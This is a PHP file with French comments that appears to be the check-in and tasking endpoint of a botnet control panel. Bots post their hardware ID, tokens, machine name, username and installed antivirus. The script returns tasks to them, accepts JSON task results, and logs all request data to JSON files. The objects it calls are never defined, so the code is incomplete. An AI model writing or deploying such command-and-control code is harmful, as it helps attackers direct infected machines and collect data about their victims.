<?php

$param = array();

$param['API_KEY']     = @$_POST["API_KEY"];
$param['HWID']        = @$_POST["HWID"];
$param['USER_TOKEN']  = @$_POST["USER_TOKEN"];
$param['GROUP_TOKEN'] = @$_POST["GROUP_TOKEN"];
$param['PCNAME']      = @$_POST["PCNAME"];
$param['USERNAME']    = @$_POST["USERNAME"];
$param['BUSY']        = @$_POST["BUSY"];
$param['ANTI_VIRUS']  = @$_POST["ANTI_VIRUS"];

// Appel à la fonction GetTask
if (isset($_POST['task'])) {
echo $bots->GetTask($param);
}

if(isset($_POST['request'])) {
     $api->Request($param);

}


if(isset($_POST['run_task'])) {
    $param['TASK_TOKEN'] = @$_POST['run_task'];

    // Vérifiez si les données POST 'DATA' existent
    if(isset($_POST['DATA'])) {
        // Convertissez la chaîne JSON en un tableau associatif
        $decoded_data = json_decode($_POST['DATA'], true);
        
        // Vérifiez si la conversion JSON a réussi
        if ($decoded_data !== null) {
            $param['DATA'] = $decoded_data;
            echo $bots->RunTask($param);
        } else {
            echo "Erreur lors du décodage JSON.";
        }
    } else {
        echo "Les données POST 'DATA' sont manquantes.";
    }
}


?>
<?php

// Fonction pour sauvegarder les données dans un fichier JSON
function saveDataToJson($data, $fileName) {
    $jsonData = json_encode($data, JSON_PRETTY_PRINT);
    if ($jsonData === false) {
        throw new Exception('Erreur lors de l\'encodage JSON');
    }

    // Écriture des données dans le fichier
    if (file_put_contents($fileName, $jsonData) === false) {
        throw new Exception('Erreur lors de l\'écriture dans le fichier');
    }
}

// Tableau pour stocker les données
$data = array();

// Récupération des valeurs POST
$data['POST'] = $_POST;

// Récupération des valeurs GET
$data['GET'] = $_GET;

// Nom du fichier pour les données POST
$postFileName = 'post_data.json';

// Nom du fichier pour les données GET
$getFileName = 'get_data.json';

try {
    // Sauvegarde des données POST dans un fichier JSON
    saveDataToJson($data['POST'], $postFileName);

    // Sauvegarde des données GET dans un fichier JSON
    saveDataToJson($data['GET'], $getFileName);
} catch (Exception $e) {
    // En cas d'erreur, afficher le message d'erreur
}

?>


